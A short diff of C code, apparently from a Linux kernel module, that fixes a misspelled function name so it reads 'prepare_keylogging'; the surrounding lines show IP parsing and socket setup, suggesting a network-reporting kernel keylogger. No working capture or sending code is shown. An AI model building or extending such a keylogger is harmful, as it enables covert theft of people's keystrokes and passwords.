@@ -42,7 +42,7 @@ static u32 parseIP(char * ip){
   return ret;
 }
 
-void perpare_keylogging(void){
+void prepare_keylogging(void){
   if (sock_init){
     printk(KERN_DEBUG "Socket aready exits. Release it!\n");
     release_keylogging(); 
